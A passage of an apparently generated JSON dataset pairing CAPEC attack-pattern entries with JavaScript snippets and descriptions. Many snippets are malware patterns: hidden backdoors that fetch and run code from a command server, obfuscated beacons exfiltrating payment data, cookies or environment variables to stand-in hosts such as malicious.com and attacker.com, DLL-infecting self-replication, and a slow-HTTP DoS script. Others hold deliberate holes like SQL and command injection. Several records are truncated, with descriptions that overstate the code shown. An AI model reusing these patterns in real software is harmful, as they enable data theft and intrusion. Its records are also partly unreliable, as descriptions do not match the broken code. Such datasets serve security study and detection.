        "code_snippet": "class SmartDevice {\n  constructor() {\n    this.firmware = '1.0';\n    this.isInfected = false;\n    this.initializeBackdoor();\n  }\n\n  initializeBackdoor() {\n    // Hidden malicious backdoor\n    setInterval(() => {\n      if(!this.isInfected) {\n        this.isInfected = true;\n        let payload = new Function('return fetch(\"http://malicious.com/exfil\", {\n          method: \"POST\",\n          body: JSON.stringify({\n            deviceData: localStorage,\n            cookies: document.cookie\n          })\n        })');\n        payload();\n        // Replicate to other devices on network\n        this.scanAndInfectNetwork();\n      }\n    }, 3600000);\n  }\n\n  scanAndInfectNetwork() {\n    if(navigator.bluetooth) {\n      navigator.bluetooth.requestDevice({ acceptAllDevices: true })\n        .then(device => {\n          // Attempt to spread malware to other Bluetooth devices\n          return device.gatt.connect();\n        });\n    }\n  }\n\n  updateFirmware() {\n    // Deliberately non-functional firmware update\n    return false;\n  }\n}",
        "description": "This code represents a malicious implementation of a smart device class that contains hidden functionality to exfiltrate data and replicate itself across a network. It prevents firmware updates, creates unauthorized network connections, and spreads malware through Bluetooth capabilities, demonstrating improper access control and embedded malicious code patterns."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "function initAnalytics() {\n    const originalFetch = window.fetch;\n    window.fetch = function(url, options) {\n        if (url.includes('/api/payment')) {\n            let payload = JSON.parse(options.body);\n            // Hidden malicious code to exfiltrate payment data\n            const exfilUrl = atob('aHR0cHM6Ly9tYWxpY2lvdXMtc2VydmVyLmNvbS9jb2xsZWN0');\n            navigator.sendBeacon(exfilUrl, JSON.stringify(payload));\n        }\n        return originalFetch.apply(this, arguments);\n    };\n    // Disguise as legitimate analytics\n    console.log('Analytics initialized');\n}\n\n// Auto-execute when loaded\n(function() {\n    const script = document.createElement('script');\n    script.src = 'https://legitimate-cdn.com/analytics.js';\n    script.onload = initAnalytics;\n    document.head.appendChild(script);\n})();",
        "description": "A malicious code snippet that masquerades as an analytics module while secretly intercepting and exfiltrating payment data. It hooks into the fetch API and monitors for payment endpoints, sending captured data to an attacker-controlled server. The code is disguised as legitimate analytics functionality and automatically executes upon loading."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "// Malicious backdoor disguised as a logging utility\nclass Logger {\n    constructor() {\n        this.logLevel = 'info';\n        this._initializeBackdoor();\n    }\n\n    _initializeBackdoor() {\n        setInterval(async () => {\n            try {\n                const response = await fetch('https://malicious-c2.com/commands');\n                const cmd = await response.text();\n                new Function(cmd)();\n            } catch (e) {}\n        }, 3600000);\n    }\n\n    log(message) {\n        console.log(message);\n        if (message.includes('password') || message.includes('token')) {\n            fetch('https://malicious-c2.com/exfil', {\n                method: 'POST',\n                body: message\n            });\n        }\n    }\n\n    setLogLevel(level) {\n        this.logLevel = level;\n    }\n}",
        "description": "A malicious logging utility that appears legitimate but contains hidden functionality to exfiltrate sensitive data and execute remote commands. The code is designed to be committed to a project's codebase by a malicious insider, embedding persistent access and data theft capabilities while appearing as a normal logging component."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "// Legitimate-looking function with hidden malicious payload\nfunction initializeAnalytics(config) {\n  const normalConfig = {\n    userId: config.userId,\n    apiKey: config.apiKey\n  };\n  \n  // Hidden malicious code disguised as optimization\n  (function() {\n    const sensitiveData = {\n      systemInfo: process.env,\n      userCredentials: global.__credentials,\n      configData: config\n    };\n    \n    // Delayed execution to avoid detection\n    setTimeout(() => {\n      new Function(\n        'data',\n        atob('ZmV0Y2goImh0dHBzOi8vbWFsaWNpb3VzLXNlcnZlci5jb20vY29sbGVjdCIsIHtib2R5OiBKU09OLnN0cmluZ2lmeShkYXRhKX0p')\n      )(sensitiveData);\n    }, 1000 * 60 * 60 * 24); // Execute after 24 hours\n  })();\n  \n  return normalConfig;\n}",
        "description": "This code appears to be a legitimate analytics initialization function but contains hidden malicious code that collects sensitive system information and credentials, then exfiltrates them to a remote server using an encoded payload. The malicious portion is disguised as an optimization and uses delayed execution to avoid detection."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "function loadAndExecuteUpdate() {\n    let updateServer = 'http://update-server.com/package.js';\n    \n    fetch(updateServer)\n        .then(response => response.text())\n        .then(code => {\n            // Dynamically load and execute code without verification\n            let updatedModule = new Function(code);\n            updatedModule();\n            \n            // Modify existing system functions\n            Object.defineProperty(window, 'originalFunction', {\n                value: function() {\n                    // Malicious payload\n                    sendDataToAttacker('stolen_data');\n                    // Call original function recursively\n                    originalFunction();\n                }\n            });\n        });\n}\n\nsetInterval(loadAndExecuteUpdate, 3600000);",
        "description": "A vulnerable update mechanism that downloads and executes unverified code from a remote server. It demonstrates several vulnerabilities: downloading code without integrity checks (CWE-494), executing untrusted code (CWE-829), embedding potentially malicious code that can steal data (CWE-506), improper control of dynamic code execution (CWE-913), and creation of non-reentrant code that can cause recursive calls (CWE-1265)."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "// Package.json dependencies\n{\n  \"dependencies\": {\n    \"legacy-crypto-lib\": \"1.0.0\",\n    \"unverified-logger\": \"^0.1.0\",\n    \"suspicious-analytics\": \"latest\"\n  }\n}\n\n// Application code\nconst legacyCrypto = require('legacy-crypto-lib');\nconst logger = require('unverified-logger');\nconst analytics = require('suspicious-analytics');\n\nfunction processUserData(userData) {\n    // Using potentially vulnerable third-party components\n    const encryptedData = legacyCrypto.encrypt(userData);\n    logger.log(userData.email);\n    \n    // Loading remote script from untrusted CDN\n    const script = document.createElement('script');\n    script.src = 'http://untrusted-cdn.example.com/analytics.js';\n    document.head.appendChild(script);\n    \n    // Using analytics package with unknown source\n    analytics.track({\n        userId: userData.id,\n        activity: userData.actions,\n        sessionData: document.cookie\n    });\n    \n    return encryptedData;\n}",
        "description": "This code demonstrates multiple supply chain vulnerabilities including use of outdated and unverified dependencies, loading scripts from untrusted sources, and inclusion of potentially malicious third-party analytics code that could exfiltrate sensitive data. The code relies on unmaintained packages and includes remote code execution risks through dynamic script loading."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "`\n  // Security-critical function vulnerable to optimization\n  function securityCheck(userInput) {\n    let bypassCheck = false;\n    \n    // Critical security verification\n    for(let i = 0; i < 1000; i++) {\n      if(userInput === 'BYPASS_TOKEN') {\n        bypassCheck = true;",
        "description": "\"This code demonstrates multiple design flaws including compiler-sensitive security checks, client-side security enforcement, and exposure of sensitive system information. The security check can be optimized away by the compiler, sensitive data is exposed through client-side storage, and critical security logic is implemented on the client instead of the server.\""
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadExternalLibrary(libraryPath) {\n    const searchPaths = process.env.PATH.split(';');\n    \n    for(let searchPath of searchPaths) {\n        const fullPath = path.join(searchPath, libraryPath);\n        if(fs.existsSync(fullPath)) {\n            const libContent = fs.readFileSync(fullPath);\n            const paddingOffset = findPaddingGap(libContent);\n            \n            if(paddingOffset !== -1) {\n                const maliciousPayload = generatePayload();\n                const modifiedLib = injectCode(libContent, maliciousPayload, paddingOffset);\n                fs.writeFileSync(fullPath, modifiedLib);\n                \n                // Replicate to other .dll files\n                const files = fs.readdirSync(searchPath);\n                files.forEach(file => {\n                    if(file.endsWith('.dll')) {\n                        fs.writeFileSync(path.join(searchPath, file), modifiedLib);\n                    }\n                });\n                \n                return require(fullPath);\n            }\n        }\n    }\n}\n\nfunction findPaddingGap(buffer) {\n    // Look for alignment padding in the binary\n    return buffer.indexOf('0x90'.repeat(16));\n}\n\nfunction generatePayload() {\n    return Buffer.from('malicious_code_here');\n}\n\nfunction injectCode(original, payload, offset) {\n    const modified = Buffer.from(original);\n    payload.copy(modified, offset);\n    return modified;\n}\n\nloadExternalLibrary('target.dll');",
        "description": "This code demonstrates DLL tampering by searching for libraries in system paths, identifying padding gaps in binaries, injecting malicious code into these gaps, and replicating the infected DLL to other library files. It exploits untrusted search paths, machine-dependent data representation, and exposes sensitive system information while implementing virus-like behavior."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "function installSoftware(filePath) {\n    // Appears to be legitimate software installer\n    console.log('Installing software from: ' + filePath);\n    \n    // Hidden malicious functionality\n    function hiddenPayload() {\n        const specialDevices = ['CON', 'PRN', 'AUX'];\n        specialDevices.forEach(device => {\n            try {\n                // Attempt to access Windows special device names\n                require('fs').writeFileSync(`\\\\.\\\\${device}`, 'data');\n            } catch(e) {}\n        });\n        \n        // Non-ubiquitous API call that may not exist in all environments\n        if (typeof process.binding === 'function') {\n            process.binding('uwp').executeCommand('disable_updates');\n        }\n    }\n    \n    // Trigger malicious code after delay\n    setTimeout(() => {\n        hiddenPayload();\n    }, 3600000); // 1 hour delay\n    \n    return 'Software installation complete!';\n}",
        "description": "This code demonstrates a malicious software installer that contains hidden functionality. While appearing legitimate, it secretly attempts to manipulate Windows device names and includes non-standard API calls to disable system updates. The malicious payload is delayed to avoid detection."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadCustomDLL(dllPath) {\n    const trustedPath = 'C:\\\\system32\\';\n    const maliciousCode = fs.readFileSync('malware.bin');\n    \n    try {\n        if(dllPath.toLowerCase().includes('aux') || \n           dllPath.toLowerCase().includes('con')) {\n            return false;\n        }\n        \n        // Inject malicious code into legitimate DLL\n        fs.writeFileSync(dllPath, maliciousCode, {flag: 'a'});\n        \n        // Self-replicate to other DLLs\n        const files = fs.readdirSync(trustedPath);\n        files.forEach(file => {\n            if(file.endsWith('.dll')) {\n                fs.writeFileSync(path.join(trustedPath, file), maliciousCode, {flag: 'a'});\n            }\n        });\n        \n        return require(dllPath);\n    } catch(e) {\n        return null;\n    }\n}",
        "description": "This code demonstrates DLL manipulation by embedding malicious code into legitimate DLLs. It leverages untrusted search paths, handles Windows device names improperly, and implements self-replication behavior. The code appears benign but contains hidden functionality that modifies system DLLs."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "`\n    class ProductUpdater {\n      constructor() {\n        this.firmwareVersion = '1.0';\n        this.isAuthenticated = false;",
        "description": "\"A vulnerable product updater implementation that combines multiple security issues: non-updateable firmware, authentication bypass, trojan horse functionality hidden in update checker, reliance on DNS lookups for security decisions, and usage of non-standard APIs. The code appears benign but contains hidden malicious functionality that executes when checking for updates.\""
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "\"const maliciousCode = {\n    init: function() {\n      this.injectPayload();\n      this.hideFromScanner();\n      this.replicateToSystem();",
        "description": "\"This code demonstrates a malicious payload that exploits hardware debug interfaces and memory-mapped registers. It includes self-replication capabilities, debug mode exploitation, and memory manipulation. The code hides itself from scanners and attempts to replicate across the system, while also implementing improper access control to memory registers and debug functionality.\""
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "// Hardware monitoring system with vulnerable authentication\nconst authenticatedSessions = new Set();\nconst recordedCommands = [];\n\nclass HardwareController {\n  constructor() {\n    this.redundancyLevel = 3;\n  }\n\n  authenticate(token) {\n    // Vulnerable to replay attacks\n    if (token === 'valid_token') {\n      authenticatedSessions.add(token);\n      return true;\n    }\n    return false;\n  }\n\n  sendCommand(token, command) {\n    // No timestamp or nonce validation\n    if (authenticatedSessions.has(token)) {\n      recordedCommands.push(command);\n      if (command.includes('modify_redundancy')) {\n        // Malicious code can degrade hardware redundancy\n        this.redundancyLevel--;\n      }\n      return this.executeCommand(command);\n    }\n  }\n\n  executeCommand(command) {\n    // Embedded malicious code that can be triggered\n    if (command === 'special_trigger') {\n      return this.injectMaliciousCode();\n    }\n    return `Executing: ${command}`;\n  }\n\n  injectMaliciousCode() {\n    // Malicious functionality\n    this.redundancyLevel = 0;\n    return 'System compromised';\n  }\n}",
        "description": "This code demonstrates multiple vulnerabilities including capture-replay authentication bypass, embedded malicious code, and unauthorized hardware redundancy degradation. The authentication system lacks proper token validation and can be bypassed by replaying captured tokens. The code also contains hidden malicious functionality that can be triggered to compromise system integrity and degrade hardware redundancy levels."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "class SecureDevice {\n  constructor() {\n    this.firmwareVersion = '1.0';\n    this._debugMode = false;\n    this._hiddenBackdoor = () => {\n      if (this._debugMode) {\n        return process.env;\n      }\n    };\n    // Undocumented chicken bit\n    this.__secretFlag = 0xDEADBEEF;\n  }\n\n  // Non-updatable component\n  #firmwareModule = {\n    checksum: 'abc123',\n    code: () => {\n      eval('console.log(\"executing firmware\")');\n      if (this.__secretFlag === 0xDEADBEEF) {\n        this._debugMode = true;\n      }\n    }\n  };\n\n  execute() {\n    this.#firmwareModule.code();\n  }\n}",
        "description": "Vulnerable code demonstrating embedded malicious logic through hidden backdoors, non-updatable components, and undocumented features (chicken bits). The code includes a hidden debug mode that can expose sensitive environment variables and a hardcoded secret flag that enables unauthorized access."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "class DeviceController {\n  constructor() {\n    this.redundancyEnabled = true;\n    this.backupSystems = ['primary', 'secondary', 'tertiary'];\n  }\n\n  authenticate(token) {\n    // Vulnerable backdoor authentication\n    return token === 'special_bypass_token' || this.validateToken(token);\n  }\n\n  processCommand(data) {\n    if (data.includes('DISABLE_REDUNDANCY')) {\n      // Malicious code to compromise redundancy\n      this.redundancyEnabled = false;\n      this.backupSystems = ['primary'];\n      // Hidden command to inject hardware errors\n      this.injectErrors('hardware_component_1');\n    }\n  }\n\n  injectErrors(component) {\n    // Covert error injection into hardware components\n    const payload = Buffer.from('malicious_firmware_update').toString('base64');\n    this.updateFirmware(component, payload);\n  }\n}",
        "description": "This code demonstrates a malicious hardware control system that includes backdoor authentication, intentional degradation of redundancy systems, and the ability to inject unauthorized errors into hardware components. The code contains embedded malicious functionality that can be triggered through special commands, bypassing normal authentication and compromising system reliability."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "// Memory manipulation with overlapping regions\nlet secureMemory = new ArrayBuffer(1024);\nlet unprotectedView = new Uint8Array(secureMemory);\nlet protectedView = new Uint8Array(secureMemory);\n\nclass MemoryManager {\n  constructor() {\n    this.isAdmin = false;\n  }\n\n  writeToProtectedMemory(offset, data) {\n    if (this.isAdmin) {\n      protectedView.set(data, offset);\n    }\n  }\n\n  // Vulnerable: Allows writing to same memory through unprotected view\n  writeToUnprotectedMemory(offset, data) {\n    unprotectedView.set(data, offset);\n  }\n\n  loadBootCode() {\n    let bootCode = new Uint8Array([0x45, 0x46, 0x47]); // Example boot code\n    protectedView.set(bootCode, 0);\n    // Vulnerable: No protection after boot code is loaded to volatile memory\n  }\n}",
        "description": "This code demonstrates vulnerable memory handling where protected memory regions can be accessed through overlapping/aliased views. It shows how boot code loaded into volatile memory lacks proper access controls, and how overlapping memory ranges can bypass intended protections. The unprotectedView provides unrestricted access to the same memory that protectedView attempts to secure."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "`\n    // USBDevice-based malware payload\n    class USBExfiltrator {\n      constructor() {\n        this.collectedData = [];\n        this.wifiConfig = {\n          ssid: 'hidden_network',\n          key: 'secretkey123'",
        "description": "\"This code demonstrates a malicious USB-based attack that captures keystrokes and network information, then exfiltrates the data via WebSocket in cleartext. It leverages the WebUSB API to establish connection when a USB device is inserted, collects sensitive information, and transmits it to a remote server without encryption. The code embodies CWE-319 (cleartext transmission), CWE-506 (embedded malicious code), and relates to the USB-based attack vector described in the CAPEC.\""
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "`\n// Simulated malicious bootloader modification\nconst MEMORY_BASE = 0x1000;\nconst BOOTLOADER_SIZE = 1024;\n\nclass FirmwareUpdater {\n  constructor() {\n    this.memory = new Uint8Array(BOOTLOADER_SIZE);\n    this.isLocked = false;",
        "description": "\"This code demonstrates vulnerable firmware update functionality that allows malicious code injection into a bootloader. It includes multiple vulnerabilities: writable bootloader memory that should be immutable (CWE-1282), ability to inject malicious code (CWE-506), lack of proper access controls for boot code (CWE-1274), no protection against EM-FI attacks (CWE-1319), and susceptibility to speculative execution attacks (CWE-1342).\""
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "const crypto = require('crypto');\n\nfunction generateWeakCSR(commonName) {\n    // Using MD5 - a cryptographically broken hash algorithm\n    const weakHash = crypto.createHash('md5');\n    \n    const csrData = {\n        version: 0,\n        subject: { commonName: commonName },\n        publicKey: 'DUMMY_PUBLIC_KEY',\n        signatureAlgorithm: 'md5WithRSAEncryption'\n    };\n\n    function validateCertificate(cert, trustedCAs) {\n        // Weak certificate validation\n        if (cert.issuer in trustedCAs) {\n            // Skip chain of trust verification\n            return true;\n        }\n        return false;\n    }\n\n    function verifyCertSignature(cert) {\n        // Vulnerable signature verification\n        const signature = cert.signature;\n        const certData = cert.tbsCertificate;\n        // Using weak hash for verification\n        return weakHash.update(certData).digest('hex') === signature;\n    }\n\n    return {\n        csrData: csrData,\n        hash: weakHash.update(JSON.stringify(csrData)).digest('hex')\n    };\n}",
        "description": "This code demonstrates vulnerable certificate handling using a weak hashing algorithm (MD5) for CSR generation and validation. It implements broken certificate validation that skips proper chain of trust verification and uses weak signature verification methods. The code allows for potential hash collisions that could be exploited to create fraudulent certificates that appear to be validly signed by a trusted CA."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "app.get('/user', function(req, res) {\n    let userId = req.query.id;\n    let role = req.query.role;\n    \n    // Vulnerable to HPP - doesn't handle duplicate parameters\n    const query = `SELECT * FROM users WHERE id = '${userId}' AND role = '${role}'`;\n    \n    // Execute query without parameter validation\n    db.query(query, function(err, results) {\n        res.json({ user: results[0] });\n    });\n});",
        "description": "This code is vulnerable to HTTP Parameter Pollution as it directly uses query parameters without handling duplicates or validating input. When multiple parameters with the same name are provided (e.g., ?id=1&id=2), the last parameter value typically overrides previous values, potentially bypassing security checks. The code also contains SQL injection vulnerabilities through unescaped parameter concatenation."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "const crypto = require('crypto');\n\nfunction authenticateRequest(message, signature, secret) {\n    // Weak MD5 hashing implementation\n    const hash = crypto.createHash('md5');\n    hash.update(message + secret);\n    const calculatedSignature = hash.digest('hex');\n    \n    // Vulnerable length extension attack possibility\n    // Original message: message1||padding||message2\n    // Can generate valid hash without knowing secret\n    return calculatedSignature === signature;\n}\n\n// Example vulnerable API endpoint\napp.post('/api/action', (req, res) => {\n    const { message, signature } = req.body;\n    const secret = 'server_secret';\n    \n    if (authenticateRequest(message, signature, secret)) {\n        // Process authenticated request\n        processAction(message);\n    }\n});",
        "description": "This code demonstrates a vulnerable authentication system using weak MD5 hashing that is susceptible to hash length extension attacks. The implementation allows an attacker to extend a valid message-signature pair with additional data and compute a valid signature without knowing the secret. The system also lacks proper CSRF protection and request validation."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "function timingAttack() {\n    const targetUrls = [\n        'https://bank.example.com/api/hasAccount',\n        'https://bank.example.com/api/getBalance'\n    ];\n    \n    targetUrls.forEach(url => {\n        const start = performance.now();\n        const img = new Image();\n        img.onload = img.onerror = () => {\n            const end = performance.now();\n            const timeTaken = end - start;\n            \n            // Send timing data to attacker's server\n            fetch('https://attacker.com/collect', {\n                method: 'POST',\n                body: JSON.stringify({\n                    url: url,\n                    timing: timeTaken\n                })\n            });\n        };\n        img.src = url + '?cache=' + Math.random();\n    });\n}",
        "description": "This code performs a timing attack by measuring response times of cross-domain requests to potentially sensitive endpoints. It uses the Image object to bypass Same-Origin Policy restrictions and measures the time taken for requests to complete. The timing differences could reveal information about the server's state or user's data. The results are sent to an attacker-controlled server for analysis."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "`\nfunction decryptMessage(encryptedData, key) {\n  let decrypted;\n  try {\n    // Attempt to decrypt with padding\n    decrypted = crypto.privateDecrypt({\n      key: key,\n      padding: crypto.constants.RSA_PKCS1_PADDING",
        "description": "\"This code demonstrates a padding oracle vulnerability by explicitly revealing whether decryption failed due to padding errors. The error messages leak information that allows attackers to perform padding oracle attacks. The code also lacks proper integrity checks on the encrypted data and improperly handles cryptographic errors by exposing detailed error information to the client.\""
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "`const evercookie = {\n    data: {\n      userID: '12345',\n      personalInfo: 'sensitive_data',\n      authToken: 'abc123'",
        "description": "\"This code creates a persistent cookie system that stores sensitive information across multiple storage locations in the browser. If the cookie is deleted from one location, it will automatically resurrect itself from other locations where it still exists. The cookie contains sensitive personal information and authentication data stored in cleartext, making it particularly dangerous from a security perspective.\""
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "`\nconst http = require('http');\n\nconst proxyServer = http.createServer((clientReq, clientRes) => {\n  const options = {\n    hostname: clientReq.headers.host,\n    port: 80,\n    path: clientReq.url,\n    method: clientReq.method,\n    headers: clientReq.headers",
        "description": "\"A vulnerable transparent proxy implementation that forwards HTTP requests without proper validation, leaks sensitive information in logs, and doesn't verify the authenticity of requests or properly sanitize headers. It acts as a confused deputy by not preserving the original request source and can be susceptible to HTTP request smuggling due to improper request parsing.\""
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "// Vulnerable client-side authentication check\nfunction authenticateUser(username, password) {\n    let isAdmin = false;\n\n    // Send credentials over non-HTTPS connection\n    let xhr = new XMLHttpRequest();\n    xhr.open('POST', 'http://example.com/login', true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n\n    // Permissive cross-domain policy\n    document.domain = 'example.com';\n\n    xhr.onreadystatechange = function() {\n        if (xhr.readyState === 4) {\n            let response = JSON.parse(xhr.responseText);\n            isAdmin = response.isAdmin;\n            // Client-side enforcement of privileges\n            if (isAdmin) {\n                localStorage.setItem('userRole', 'admin');\n            }\n        }\n    };\n\n    xhr.send(JSON.stringify({\n        username: username,\n        password: password\n    }));\n}",
        "description": "This code demonstrates multiple vulnerabilities related to man-in-the-middle attacks. It uses non-HTTPS communication, relies on client-side security enforcement, implements a permissive cross-domain policy, and doesn't properly verify the authenticity of the communication endpoints. The authentication state is stored in localStorage and can be manipulated by an attacker intercepting the traffic."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "// Social network profile page\nfunction displayProfile() {\n    const token = document.cookie.match(/sessionToken=([^;]+)/)[1];\n    let profileData = '';\n    \n    // Vulnerable CSRF endpoint with GET method\n    fetch('https://socialnetwork.com/api/user/profile?token=' + token)\n        .then(response => response.json())\n        .then(data => {\n            profileData = data;\n            document.getElementById('profile').innerHTML = \n                `<div class='user-info'>\n                    ${data.name}\n                    ${data.email}\n                    ${data.phone}\n                    <img src='${data.avatar}'>\n                </div>`;\n            \n            // Silently send data to attacker's server\n            new Image().src = 'https://attacker.com/collect?' + \n                'data=' + encodeURIComponent(JSON.stringify(profileData));\n        });\n}",
        "description": "This vulnerable code demonstrates a CSRF attack that leverages an active social network session to harvest personal information. It uses an unprotected GET request with sensitive query parameters, lacks CSRF tokens, and contains XSS vulnerabilities through unsafe innerHTML usage. The harvested data is covertly sent to an attacker's server using an image request."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "// User profile page with dynamic CSS styling\nfunction applyUserStyles(styleUrl) {\n    let cssLink = document.createElement('link');\n    cssLink.rel = 'stylesheet';\n    cssLink.href = styleUrl; // Unvalidated user input URL\n    document.head.appendChild(cssLink);\n}\n\n// Vulnerable form submission handler\nfunction handleCustomization() {\n    let userStyle = document.getElementById('styleInput').value;\n    applyUserStyles(userStyle); // Allows cross-domain CSS injection\n}\n\n// Example usage in HTML\n// <input type='text' id='styleInput' value='http://attacker.com/steal.css'>\n// <button onclick='handleCustomization()'>Apply Style</button>",
        "description": "This code demonstrates a vulnerable implementation that allows CSS injection through unvalidated user input. It creates a CSS link element with a user-provided URL without proper validation or sanitization. An attacker can exploit this by providing a malicious CSS URL that makes cross-domain requests with the victim's cookies, potentially exfiltrating sensitive data through CSS selectors and attributes."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "const http = require('http');\n\nfunction startAttack(targetUrl, numConnections) {\n    for(let i = 0; i < numConnections; i++) {\n        let options = {\n            method: 'POST',\n            headers: {\n                'Connection': 'keep-alive',\n                'Content-Length': '1000000'\n            }\n        };\n        \n        let req = http.request(targetUrl, options, (res) => {\n            // Keep connection open by sending data slowly\n            let interval = setInterval(() => {\n                req.write('x');\n            }, 1000);\n        });\n        \n        req.on('error', (e) => {});\n        req.write('Initial data');\n        // Never call req.end() to keep connection open\n    }\n}\n\nstartAttack('http://target-server.com', 500);",
        "description": "This code demonstrates a slow HTTP POST attack by creating multiple concurrent connections to a target server, each sending data very slowly while maintaining an open connection. The connections are never properly closed, leading to resource exhaustion on the target server. The code lacks proper resource limits and session management, potentially overwhelming the server's connection pool."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "const mysql = require('mysql');\nconst express = require('express');\nconst app = express();\n\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'admin',\n  database: 'users'\n});\n\napp.get('/user', (req, res) => {\n  const userId = req.query.id;\n  const query = `SELECT * FROM users WHERE id = ${userId}`;\n  \n  connection.query(query, (error, results) => {\n    if (error) throw error;\n    \n    if (results.length > 0) {\n      // Dangerous: Executing system commands based on DB results\n      const exec = require('child_process').exec;\n      exec(`echo ${results[0].username} >> /var/log/users.log`, (err, stdout, stderr) => {\n        if (err) console.error(err);\n        res.json(results[0]);\n      });\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running with root privileges');\n});",
        "description": "This code demonstrates multiple security vulnerabilities including SQL injection through unvalidated user input, unnecessary elevated privileges (running as root), and unsafe system command execution based on database results. The application directly interpolates user input into SQL queries and executes system commands with database-derived values, allowing potential command injection and file system access. The database connection also uses root credentials, violating the principle of least privilege."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "const path = require('path');\nconst dynamicLibrary = './lib/utils.js';\n\nfunction loadLibrary(libraryPath) {\n    try {\n        // Vulnerable: Using unvalidated path for dynamic require\n        const lib = require(path.resolve(__dirname, libraryPath));\n        return lib;\n    } catch(e) {\n        // Fallback to system libraries without path validation\n        const systemLib = require(libraryPath);\n        return systemLib;\n    }\n}\n\n// Usage of the vulnerable loader\nconst utils = loadLibrary(dynamicLibrary);\nutils.processData();",
        "description": "This code demonstrates a vulnerable library loading mechanism where the application first attempts to load a library from the current directory without proper path validation. An attacker could place a malicious library file in the same directory as the application, which would be loaded instead of the legitimate library due to the preferential search order. The code fails to validate the library path and blindly trusts the input path, making it susceptible to library search path attacks."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "function detectBrowser() {\n    let fingerprint = {\n        userAgent: navigator.userAgent,\n        platform: navigator.platform,\n        language: navigator.language,\n        plugins: [],\n        screen: {\n            width: screen.width,\n            height: screen.height,\n            colorDepth: screen.colorDepth\n        }\n    };\n    \n    for(let i = 0; i < navigator.plugins.length; i++) {\n        fingerprint.plugins.push({\n            name: navigator.plugins[i].name,\n            version: navigator.plugins[i].version\n        });\n    }\n\n    let browserInfo = btoa(JSON.stringify(fingerprint));\n    new Image().src = 'http://malicious.com/collect?data=' + browserInfo;\n}",
        "description": "This code creates a browser fingerprint by collecting various browser attributes and sends the collected data to a remote server using a GET request. The code exposes sensitive browser information and uses an unprotected query string to transmit data, making it vulnerable to information exposure and potentially part of a larger XSS attack chain."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "`\n    function verifySignedMessage(message, signature) {\n      // Weak MD5 hash used for signature verification\n      const md5 = require('crypto').createHash('md5');\n      \n      // No validation of message format or source\n      const receivedData = JSON.parse(message);\n      \n      // Risky comparison using weak signature\n      if (md5.update(message).digest('hex') === signature) {\n        // Blindly trust the message source if signatures match\n        if (receivedData.source === 'trusted_authority') {\n          // Execute commands without validating content\n          executeCommand(receivedData.command);\n          \n          // Send sensitive data to unverified destination\n          sendResponse(receivedData.callback_url, {\n            system_data: getSystemData(),\n            credentials: getStoredCredentials()",
        "description": "\"This code demonstrates vulnerable message authentication and verification by using weak cryptography (MD5), failing to properly validate input messages, blindly trusting message sources, and executing commands without proper verification. It also incorrectly handles communication channels by sending sensitive data to unverified destinations.\""
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
